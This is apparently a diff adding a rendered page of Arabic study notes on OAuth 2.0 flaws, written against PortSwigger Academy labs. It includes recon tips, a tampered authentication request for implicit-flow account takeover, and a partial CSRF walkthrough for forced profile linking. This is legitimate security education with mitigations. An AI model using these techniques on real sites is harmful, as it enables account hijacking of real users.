+    <nav class="md-nav" aria-label="📌 الثغرة الأولى: التنفيذ الخاطئ للتدفق الضمني (Improper Implementation of the Implicit Flow)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#technical-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 المفهوم التقني (Technical Background)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-flaw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ أين تكمن الثغرة؟ (The Flaw)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ سيناريو الاستغلال (Exploitation Steps)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛡️ كيفية الحماية (Mitigation)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-implicit-flow-authorization-code-with-pkce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        - الحل الجذري: التوقف عن استخدام الـ Implicit Flow تماماً واستخدام Authorization Code with PKCE.
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="- الحل الجذري: التوقف عن استخدام الـ Implicit Flow تماماً واستخدام Authorization Code with PKCE.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lab-forced-oauth-profile-linking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab: Forced OAuth profile linking :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Objective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-observation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Key Observation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#normal-oauth-linking-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔄 Normal OAuth Linking Flow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔄 Normal OAuth Linking Flow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-login-normally" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Login Normally
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-attach-social-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Attach Social Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-authenticate-with-social-media" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Authenticate With Social Media
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-idea" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 Attack Idea
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-steps_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ Exploitation Steps
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🛠️ Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-login-normally" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — Login Normally
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-start-oauth-linking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — Start OAuth Linking
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-intercept-oauth-callback" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — Intercept OAuth Callback
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-copy-url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4 — Copy URL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-drop-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5 — Drop Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-logout" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6 — Logout
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#create-csrf-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 Create CSRF Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-result" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚨 Exploitation Result
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        👑 Account Takeover
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-step" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏁 Final Step
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root-cause" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔐 Root Cause
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Important Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧷 Payload Used
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🧷 Payload Used">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lab-oauth-account-hijacking-via-redirect_uri" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab: OAuth account hijacking via redirect_uri
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#objective_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Objective
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-observation_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Key Observation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#normal-oauth-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔄 Normal OAuth Flow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔄 Normal OAuth Flow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-user-logs-in" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — User Logs In
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-oauth-authorization-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — OAuth Authorization Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-oauth-server-redirects-back" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — OAuth Server Redirects Back
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-idea_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 Attack Idea
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-steps_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ Exploitation Steps
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🛠️ Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-complete-oauth-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Complete OAuth Login
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-observe-silent-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Observe Silent Authentication
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-find-authorization-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Find Authorization Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-test-redirect_uri" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Test redirect_uri
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-follow-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Follow Redirect
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#build-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 Build Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚨 Exploitation Flow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚨 Exploitation Flow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#victim-visits-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Victim Visits Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#account-takeover_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔓 Account Takeover
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-step_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏁 Final Step
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root-cause_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔐 Root Cause
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-notes_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Important Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload-used_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧷 Payload Used
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h2 id="oauth-20">يعني إيه OAuth 2.0 أصلاً ؟</h2>
+<p>تخيل إنك دخلت موقع وبدل ما تعمل <strong>Sign up</strong> جديد، لقيت زرار:</p>
+<ul>
+<li>Login with Google</li>
+<li>Login with Facebook</li>
+<li>Login with GitHub</li>
+</ul>
+<p>دي كلها مبنية على <strong>OAuth 2.0</strong>.</p>
+<p>الفكرة الأساسية:<br />
+الموقع الجديد <strong>ما بياخدش الباسورد بتاعك</strong>… لكنه بياخد <strong>إذن access محدود</strong> من حسابك في موقع تاني.</p>
+<p>يعني بدل ما تدي الموقع الباسورد بتاع Google، Google نفسه يقول له:</p>
+<blockquote>
+<p>آه المستخدم ده موافق إنك تعرف إيميله مثلاً.</p>
+</blockquote>
+<hr />
+<h2 id="oauth">ليه OAuth مهم للمهاجمين؟</h2>
+<p>لأنه:</p>
+<ol>
+<li>منتشر جداً في كل المواقع</li>
+<li>معقد شوية</li>
+<li>أي غلطة صغيرة في التطبيق = ممكن تعمل كارثة 🔥</li>
+</ol>
+<p>والنتيجة ممكن تكون:</p>
+<ul>
+<li>سرقة بيانات المستخدم</li>
+<li>تسجيل دخول بدون باسورد</li>
+<li>أو حتى takeover كامل للحساب</li>
+</ul>
+<p>وده سبب إن PortSwigger عامل لابات كتير عليه.</p>
+<hr />
+<h2 id="oauth_1">طيب إيه فكرة OAuth الأساسية؟</h2>
+<p>OAuth = <strong>Authorization framework</strong><br />
+مش Authentication في الأصل.</p>
+<p>يعني المفروض يستخدم عشان:</p>
+<blockquote>
+<p>تطبيق يطلب إذن للوصول لبياناتك من تطبيق تاني.</p>
+</blockquote>
+<p>مثال:</p>
+<ul>
+<li>موقع عايز يشوف الـ contacts بتوع Gmail</li>
+<li>أو يشوف الإيميل بس</li>
+</ul>
+<p>مش ياخد باسورد Gmail.</p>
+<hr />
+<h2 id="_1">الفرق المهم جداً ⚠️</h2>
+<table>
+<thead>
+<tr>
+<th>Authentication</th>
+<th>Authorization</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>إثبات إنك مين</td>
+<td>إعطاء إذن للوصول لبياناتك</td>
+</tr>
+<tr>
+<td>Login</td>
+<td>Access to data</td>
+</tr>
+</tbody>
+</table>
+<p>لكن حصلت حاجة:<br />
+الناس بدأت تستخدم OAuth كـ <strong>Login system</strong> كمان.<br />
+وده سبب مشاكل أمنية كتير.</p>
+<hr />
+<h2 id="_2">سيناريو بسيط يوضح الفكرة</h2>
+<p>خلينا نمثل بـ 3 أطراف:</p>
+<ol>
+<li>المستخدم (أنت)</li>
+<li>الموقع اللي عايز تسجل فيه → اسمه <strong>Client</strong></li>
+<li>الموقع اللي عندك فيه حساب → اسمه <strong>OAuth Provider</strong> (زي Google)</li>
+</ol>
+<h3 id="_3">خطوات تسجيل الدخول:</h3>
+<p>1️⃣ تضغط "Login with Google"<br />
+2️⃣ الموقع يحولك على Google<br />
+3️⃣ Google يسألك:</p>
+<blockquote>
+<p>هل توافق إن الموقع ده يعرف الإيميل بتاعك؟</p>
+</blockquote>
+<p>4️⃣ تضغط Allow<br />
+5️⃣ Google يرجع الموقع بـ <strong>Access Token</strong><br />
+6️⃣ الموقع يستخدم التوكن عشان يعرف مين المستخدم</p>
+<p>وبكده سجلت دخول… بدون ما الموقع يعرف الباسورد.</p>
+<hr />
+<h2 id="_4">فين المشكلة بقى؟</h2>
+<p>العملية دي فيها:</p>
+<ul>
+<li>Redirects</li>
+<li>Tokens</li>
+<li>URLs</li>
+<li>Parameters</li>
+<li>عدة أطراف</li>
+</ul>
+<p>أي غلطة في التنفيذ → ثغرة.</p>
+<p>عشان كده القسم ده هيعلمك:</p>
+<ul>
+<li>ازاي تكتشف ثغرات OAuth</li>
+<li>ازاي تستغلها في اللابات</li>
+<li>ازاي تحمي التطبيقات</li>
+</ul>
+<hr />
+<h2 id="_5">أهم نقطة لازم تفهمها قبل اللابات</h2>
+<p>OAuth بيعتمد على:</p>
+<ul>
+<li>trust بين مواقع مختلفة</li>
+<li>redirects بين domains مختلفة</li>
+<li>tokens حساسة جداً</li>
+</ul>
+<p>وده بيخليه بيئة مثالية للهجوم 😈</p>
+<hr />
+<p>[^1]</p>
+<p>[^1]: # 🛡️ دليل اختراق وثغرات OAuth 2.0</p>
+<pre><code>**الموضوع:** مفاهيم، تدفقات العمل (Flows)، وطرق الاستغلال (Exploitation) **المصدر:** PortSwigger Academy + شرح جيمي
+
+---
+
+## 1. المفاهيم الأساسية (Terminology)
+
+الـ OAuth هو بروتوكول بيسمح لموقع (A) إنه يوصل لبيانات من موقع (B) نيابة عن المستخدم، من غير ما الموقع (A) يعرف الباسورد بتاع المستخدم.
+
+- **Client Application:** الموقع اللي عاوز يوصل للبيانات (زي موقع الكورسات).
+
+- **Resource Owner:** المستخدم (أنت).
+
+- **Identity Provider (IdP):** السيرفر اللي شايل بياناتك (جوجل، فيسبوك).
+
+- **Authorization Server:** السيرفر المسؤول عن إصدار الأكواد والتوكنز.
+
+
+---
+
+## 2. أنواع التدفقات (Grant Types)
+
+الـ Flow هو الطريقة اللي بيتم بيها تبادل البيانات للحصول على المفتاح النهائي (**Access Token**).
+
+### A. Authorization Code Flow (الأكثر أماناً)
+
+بيتم على مرحلتين (Back-channel):
+
+1. المتصفح بيطلب **Authorization Code**.
+
+2. السيرفر (Back-end) بيتبادل الكود ده بـ **Access Token**.
+
+
+### B. Implicit Flow (الأقل أماناً)
+
+بيتم في خطوة واحدة (Front-channel):
+
+- السيرفر بيبعت الـ **Access Token** مباشرة في الـ URL (بعد علامة `#`).
+
+- **ملاحظة:** النوع ده معرض جداً للتسريب لأنه بيظهر في المتصفح.
+
+
+---
+
+## 3. الصلاحيات (Scopes)
+
+الـ **Scope** بيحدد "إيه" البيانات اللي الموقع مسموح له يشوفها.
+
+- أمثلة: `scope=email`, `scope=profile`, `scope=contacts.read`.
+
+- **OpenID Connect (OIDC):** طبقة فوق OAuth بتستخدم لتوحيد الهوية، أشهر الـ Scopes فيها: `openid`, `email`, `profile`.
+
+
+---
+
+## 4. مرحلة الاستطلاع (Recon &amp; Discovery)
+
+قبل ما تبدأ، لازم تعرف السيرفر بيدعم إيه. جرب دايماً تفتح الروابط دي:
+
+- `GET /.well-known/oauth-authorization-server`
+
+- `GET /.well-known/openid-configuration`
+
+- **الفائدة:** الملف ده (JSON) بيكشف لك الـ Endpoints المستخبية، الـ Scopes المتاحة، والـ Grant Types المدعومة.
+
+
+---
+
+## 5. الثغرات الشهيرة وكيفية استغلالها
+
+### 🚩 ثغرة الـ `redirect_uri` (الأخطر)
+
+- **الفكرة:** التلاعب بالمكان اللي السيرفر هيبعت عليه الكود أو التوكن.
+
+- **الاستغلال:**
+
+    1. غير الـ `redirect_uri` في الـ Request لعنوان سيرفرك أنت.
+
+    2. لو السيرفر مش بيتحقق (Weak Validation)، هيبعت "الكنز" (Code/Token) لعنوانك.
+
+    3. اسحب الكود واستخدمه لاختراق حساب الضحية.
+
+
+### 🚩 ثغرة الـ `state` و الـ OAuth CSRF
+
+- **الفكرة:** الـ `state` هو رقم عشوائي بيمنع الهكر من إنه يربط حسابه بحساب الضحية.
+
+- **الاستغلال:**
+
+    1. لو الـ `state` مش موجود أو ثابت، الهكر بيبدأ عملية تسجيل دخول ويوقفها عند مرحلة الـ Callback.
+
+    2. بيبعت رابط الـ Callback للضحية.
+
+    3. الضحية بيفتح الرابط، فيتم ربط حساب الهكر بحساب الضحية الحقيقي.
+
+
+### 🚩 ثغرة الـ `client_id` Spoofing
+
+- **الفكرة:** انتحال هوية أبلكيشن موثوق (زي Spotify) لخدع المستخدم.
+
+- **الاستغلال:**
+
+    1. استخدام الـ `client_id` الخاص بشركة مشهورة مع `redirect_uri` خاص بالهكر.
+
+    2. المستخدم هيشوف صفحة موافقة من "جوجل" بتقول "هل تسمح لـ Spotify؟".
+
+    3. المستخدم هيوافق، وجوجل هتبعت الكود للهكر بسبب ضعف الربط بين الـ ID والـ URI.
+
+
+---
+
+## 6. نصائح عند البحث (Hunting Tips)
+
+- **Intercept Everything:** استخدم Burp Suite لمراقبة أول طلب (`/authorize`).
+
+- **Parameter Manipulation:** جرب تغير الـ `response_type` من `code` لـ `token`.
+
+- **Information Leakage:** دور على الـ Access Token في الـ `Referer` header أو الـ Browser History.
+</code></pre>
+<hr />
+<p>الجزء ده بيحط إيده على "الوجع" في بروتوكول الـ OAuth. الفكرة كلها إن الـ OAuth مش "منتج" جاهز بتشغله، ده "مواصفات" (Specification) مرنة جداً، والمرونة دي هي اللي بتخلي المبرمجين يغلطوا.</p>
+<p>خليني أبسطلك النقاط اللي قريتها دي عشان تعرف تستخدمها وأنت بتعمل <strong>Recon</strong> (استطلاع) على أي هدف:</p>
+<hr />
+<h2 id="1-oauth-the-flexibility-trap">1. ليه الـ OAuth مليان ثغرات؟ (The Flexibility Trap)</h2>
+<p>المقال بيقول إن الـ OAuth "Spec" غامض ومفتوح. تخيل لو اديتك مكعبات ليجو وقلتلك "ابني بيت"، من غير ما أديك كتالوج.</p>
+<ul>
+<li>
+<p>واحد هيبني بيت من غير باب (نسي الـ <code>state</code> parameter).</p>
+</li>
+<li>
+<p>واحد هيبني بيت حيطانه ورق (مش بيعمل Validation للـ <code>redirect_uri</code>).</p>
+</li>
+<li>
+<p>واحد هيسيب المفتاح تحت الدواسة (باعث الـ <code>access_token</code> في الـ URL).</p>
+</li>
+</ul>
+<p>الـ OAuth بيعتمد 100% على شطارة المبرمج في سد الفتحات دي، وللأسف أغلبهم بيركز إن "البتاع يشتغل" مش إنه يكون "آمن".</p>
+<hr />
+<h2 id="2-identification">2. مرحلة الـ Identification (إزاي تعرف إنك قدام صيد ثمين؟)</h2>
+<p>وأنت فاتح الـ Burp Suite، أول ما تدوس على زرار "Log in with...", عينك تدور فوراً على الـ Request اللي رايح للـ <code>/authorization</code> أو <code>/auth</code>.</p>
+<p><strong>الـ Parameters اللي لازم "تبصم" عليها:</strong></p>
+<ul>
+<li>
+<p><strong><code>client_id</code></strong>: هوية الموقع اللي بيطلب البيانات.</p>
+</li>
+<li>
+<p><strong><code>redirect_uri</code></strong>: المكان اللي الداتا هترجع عليه (أهم هدف للهكر).</p>
+</li>
+<li>
+<p><strong><code>response_type</code></strong>: لو لقيت قيمته <code>token</code> اعرف إنك في <strong>Implicit Flow</strong> (ثغراته كتير). لو <code>code</code> يبقى <strong>Auth Code Flow</strong>.</p>
+</li>
+<li>
+<p><strong><code>state</code></strong>: لو مش موجود، مبروك عندك ثغرة <strong>CSRF</strong> محتملة جداً.</p>
+</li>
+</ul>
+<hr />
+<h2 id="3-recon">3. مرحلة الـ Recon (البحث عن الكنز المخفي) 🕵️‍♂️</h2>
+<p>دي أهم حتة في المقال. لما تعرف الـ Host بتاع الـ OAuth server (مثلاً <code>oauth.victim.com</code>)، جرب فوراً تروح للروابط دي:</p>
+<ol>
+<li>
+<p><code>GET /.well-known/oauth-authorization-server</code></p>
+</li>
+<li>
+<p><code>GET /.well-known/openid-configuration</code></p>
+</li>
+</ol>
+<h3 id="_6">ليه الروابط دي "منجم ذهب"؟</h3>
+<p>الروابط دي بترجع لك ملف <strong>JSON</strong> فيه كل أسرار السيستم، زي:</p>
+<ul>
+<li>
+<p>إيه الـ <strong>Scopes</strong> اللي مسموح بيها (ممكن تلاقي Scope سري يديك صلاحيات Admin).</p>
+</li>
+<li>
+<p>إيه الـ <strong>Grant Types</strong> اللي السيرفر بيدعمها (ممكن تكتشف إنه بيدعم الـ Implicit Flow وأنت مش عارف).</p>
+</li>
+<li>
+<p>عناوين الـ Endpoints التانية اللي ممكن تعمل عليها Fuzzing.</p>
+</li>
+</ul>
+<hr />
+<h2 id="_7">نصيحة "جيمي" ليك في الخطوة دي:</h2>
+<p>دلوقتي وأنت بتذاكر في PortSwigger، عوّد نفسك أول ما تبدأ أي Lab في الـ OAuth:</p>
+<ol>
+<li>
+<p>روح للـ <strong>HTTP History</strong>.</p>
+</li>
+<li>
+<p>اعمل Filter بكلمة <code>auth</code> أو <code>callback</code>.</p>
+</li>
+<li>
+<p>بص على الطلب الأول، وشوف الـ <code>redirect_uri</code> مكتوب إزاي. هل هو Path كامل؟ ولا Domain بس؟</p>
+</li>
+<li>
+<p>جرب في الـ Repeater تبعت طلب للـ <code>/.well-known/openid-configuration</code> وشوف السيرفر هيرد عليك بإيه.</p>
+</li>
+</ol>
+<hr />
+<p>Note:
+[^2]</p>
+<hr />
+<hr />
+<h2 id="labs">LABS :</h2>
+<h2 id="improper-implementation-of-the-implicit-flow">📌 الثغرة الأولى: التنفيذ الخاطئ للتدفق الضمني (Improper Implementation of the Implicit Flow)</h2>
+<h3 id="technical-background">🧠 المفهوم التقني (Technical Background)</h3>
+<p>في الـ <strong>Implicit Flow</strong>، لا يوجد خادم خلفي (Back-end) قوي يحتفظ بالأسرار. بدلاً من ذلك، يتم إرسال الـ <code>access_token</code> مباشرة إلى المتصفح عبر رابط URL (بعد علامة <code>#</code>). ولأن التطبيق يحتاج لإنشاء جلسة (Session) للمستخدم، يقوم المتصفح بإرسال طلب <code>POST</code> إلى السيرفر الخاص بالتطبيق يحتوي على بيانات المستخدم (مثل الإيميل) والتوكن.</p>
+<h3 id="the-flaw">⚠️ أين تكمن الثغرة؟ (The Flaw)</h3>
+<p>الثغرة تحدث بسبب <strong>"الثقة العمياء" (Blind Trust)</strong>. السيرفر يأخذ الإيميل المرسل من المتصفح ويقول: "حسناً، سأفتح حساباً لهذا الإيميل"، دون أن يرسل الـ <code>token</code> إلى مزود الخدمة (مثل جوجل) ليتأكد: <em>هل هذا التوكن يخص هذا الإيميل فعلاً؟</em></p>
+<h3 id="exploitation-steps">🛠️ سيناريو الاستغلال (Exploitation Steps)</h3>
+<ol>
+<li>
+<p><strong>الاعتراض (Interception):</strong> يقوم الهكر بتسجيل الدخول بحسابه العادي، ويعترض طلب الـ <code>POST</code> الذي يذهب إلى خادم الموقع (مثلاً الإندبوينت <code>/authenticate</code>).</p>
+<ul>
+<li><em>شكل الطلب المصاب:</em> ```json {"email":"attacker@email.com", "username":"attacker", "token":"VALID_TOKEN_HERE"}</li>
+</ul>
+</li>
+<li>
+<p><strong>التلاعب (Manipulation):</strong> يقوم الهكر بتغيير قيمة الـ <code>email</code> والـ <code>username</code> إلى بيانات الضحية (مثلاً <code>carlos</code>).</p>
+<ul>
+<li><em>شكل الطلب بعد التعديل:</em> ```json {"email":"carlos@victim.com", "username":"carlos", "token":"VALID_TOKEN_HERE"}</li>
+</ul>
+</li>
+<li>
+<p><strong>النتيجة (Impact):</strong> السيرفر يقرأ إيميل كارلوس، وينشئ <code>Session Cookie</code> خاصة بكارلوس، وبذلك يتم اختراق الحساب بالكامل (Account Takeover).</p>
+</li>
+</ol>
+<h3 id="mitigation">🛡️ كيفية الحماية (Mitigation)</h3>
+<ul>
+<li>
+<p><strong>القاعدة الذهبية:</strong> يجب على السيرفر ألا يثق أبداً بأي بيانات هوية (User ID أو Email) قادمة من المتصفح.</p>
+</li>
+<li>
+<p><strong>الحل الصحيح:</strong> السيرفر يجب أن يأخذ الـ <code>token</code> فقط، ويرسل طلب <code>GET</code> من السيرفر إلى نقطة <code>/userinfo</code> الخاصة بمزود الخدمة (جوجل/فيسبوك) ليتأكد بنفسه من الإيميل المرتبط بهذا التوكن.</p>
+</li>
+</ul>
+<h2 id="-implicit-flow-authorization-code-with-pkce">- <strong>الحل الجذري:</strong> التوقف عن استخدام الـ Implicit Flow تماماً واستخدام <strong>Authorization Code with PKCE</strong>.</h2>
+<h3 id="lab-forced-oauth-profile-linking">Lab: Forced OAuth profile linking :</h3>
+<h2 id="objective">🎯 Objective</h2>
+<p>Exploit a CSRF vulnerability in the OAuth account-linking functionality to link the attacker's social media account to the admin account, then log in as admin.</p>
+<hr />
+<h1 id="vulnerability">🧠 Vulnerability</h1>
+<pre><code>Missing state parameter in OAuth linking flow
+</code></pre>
+<p>The application does not use the <code>state</code> parameter during account linking.</p>
+<p>This makes the OAuth flow vulnerable to CSRF attacks.</p>
+<hr />
+<h1 id="key-observation">🔍 Key Observation</h1>
+<p>During the OAuth linking process:</p>
+<pre><code>GET /auth?client_id=...
+</code></pre>
+<p>The request contains:</p>
+<pre><code>redirect_uri=/oauth-linking
+</code></pre>
+<p>But:</p>
+<pre><code>No state parameter exists
+</code></pre>
+<p>Meaning:</p>
+<ul>
+<li>no CSRF protection</li>
+<li>attacker can force account linking</li>
+</ul>
+<hr />
+<h1 id="normal-oauth-linking-flow">🔄 Normal OAuth Linking Flow</h1>
+<h2 id="1-login-normally">1. Login Normally</h2>
+<p>Login using:</p>
+<ul>
+<li>username/password</li>
+</ul>
+<hr />
+<h2 id="2-attach-social-profile">2. Attach Social Profile</h2>
+<p>Click:</p>
+<pre><code>Attach a social profile
+</code></pre>
+<hr />
+<h2 id="3-authenticate-with-social-media">3. Authenticate With Social Media</h2>
+<p>User logs into social account.</p>
+<p>OAuth provider redirects back:</p>
+<pre><code>GET /oauth-linking?code=AUTH_CODE
+</code></pre>
+<p>The application links the social account to the current user.</p>
+<hr />
+<h1 id="attack-idea">💣 Attack Idea</h1>
+<p>If the attacker can force the victim to visit:</p>
+<pre><code>GET /oauth-linking?code=ATTACKER_CODE
+</code></pre>
+<p>Then the victim account becomes linked to the attacker’s social account.</p>
+<p>After that:</p>
+<pre><code>Attacker can log in as victim using social login
+</code></pre>
+<hr />
+<h1 id="exploitation-steps_1">🛠️ Exploitation Steps</h1>
+<h2 id="step-1-login-normally">Step 1 — Login Normally</h2>
+<p>Login with regular credentials.</p>
+<hr />
+<h2 id="step-2-start-oauth-linking">Step 2 — Start OAuth Linking</h2>
+<p>Click:</p>
+<pre><code>Attach a social profile
+</code></pre>
+<hr />
+<h2 id="step-3-intercept-oauth-callback">Step 3 — Intercept OAuth Callback</h2>
+<p>Using Burp Suite:</p>
+<p>Intercept:</p>
+<pre><code>GET /oauth-linking?code=XXXX
+</code></pre>
+<hr />
+<h2 id="step-4-copy-url">Step 4 — Copy URL</h2>
+<p>Right-click request:</p>
+<pre><code>Copy URL
+</code></pre>
+<p>Example:</p>
+<pre><code>https://LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN_CODE
+</code></pre>
+<hr />
